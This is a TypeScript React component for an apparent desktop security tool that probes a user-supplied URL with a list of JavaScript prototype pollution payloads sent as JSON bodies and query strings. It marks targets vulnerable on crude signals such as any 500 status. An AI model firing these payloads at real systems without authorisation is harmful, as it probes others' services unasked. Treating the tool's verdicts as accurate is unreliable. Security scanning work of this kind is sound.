import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './SharedTool.module.css';
import { ShieldIcon, LoadingIcon } from '../common/Icons';
import ToolWrapper from './ToolWrapper';

const PrototypePollution: React.FC = () => {
  const { addToolResult } = useStore();
  const [targetUrl, setTargetUrl] = useState('');
  const [results, setResults] = useState<Array<{ payload: string; vulnerable: boolean }>>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const pollutionPayloads = [
    { payload: '__proto__[polluted]=true', method: 'JSON' },
    { payload: 'constructor.prototype.polluted=true', method: 'JSON' },
    { payload: '__proto__.polluted=true', method: 'URL' },
    { payload: '?__proto__[polluted]=true', method: 'Query' },
    { payload: '?constructor[prototype][polluted]=true', method: 'Query' },
  ];

  const testPrototypePollution = async () => {
    if (!targetUrl.trim()) {
      setError('Target URL is required');
      return;
    }

    setLoading(true);
    setError(null);
    setResults([]);

    try {
      const found: Array<{ payload: string; vulnerable: boolean }> = [];

      for (const { payload, method } of pollutionPayloads) {
        try {
          let url = targetUrl;
          let body: string | undefined = undefined;
          let headers: Record<string, string> = {};

          if (method === 'JSON') {
            headers = { 'Content-Type': 'application/json' };
            body = `{"${payload.split('=')[0]}":"${payload.split('=')[1]}"}`;
          } else if (method === 'Query' || method === 'URL') {
            url = `${targetUrl}${payload}`;
          }

          const result = await window.electronAPI.net.httpFetch(url, {
            method: body ? 'POST' : 'GET',
            headers,
            body,
            timeout: 5000,
          });

          const vulnerable = !!(
            result.data &&
            (result.data.includes('polluted') ||
              result.data.includes('prototype') ||
              result.status === 500)
          );

          found.push({ payload, vulnerable });
        } catch (err) {
          found.push({ payload, vulnerable: false });
        }

        await new Promise((resolve) => setTimeout(resolve, 200));
      }

      setResults(found);

      addToolResult({
        id: Date.now().toString(),
        toolName: 'Prototype Pollution',
        timestamp: Date.now(),
        input: { targetUrl },
        output: found,
        success: true,
      });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Prototype pollution test failed';
      setError(message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ToolWrapper
      title="Prototype Pollution Scanner"
      icon={<ShieldIcon />}
      description="Test for JavaScript prototype pollution vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            className={styles.input}
            placeholder="https://example.com/api/config"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={testPrototypePollution} disabled={loading}>
            {loading ? (
              <>
                <LoadingIcon /> Testing...
              </>
            ) : (
              'Test Prototype Pollution'
            )}
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {loading && (
        <div className={styles.loadingBox}>
          <div className={styles.spinner}></div>
          <span>Testing prototype pollution vectors...</span>
        </div>
      )}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Prototype Pollution Results</span>
          </div>
          {results.map((result, idx) => (
            <div key={idx} className={styles.resultItem}>
              <div className={styles.resultRow}>
                <span className={styles.code}>{result.payload}</span>
                <span className={result.vulnerable ? styles.textError : styles.textSuccess}>
                  {result.vulnerable ? 'VULNERABLE!' : 'Safe'}
                </span>
              </div>
            </div>
          ))}
        </div>
      )}
    </ToolWrapper>
  );
};

export default PrototypePollution;
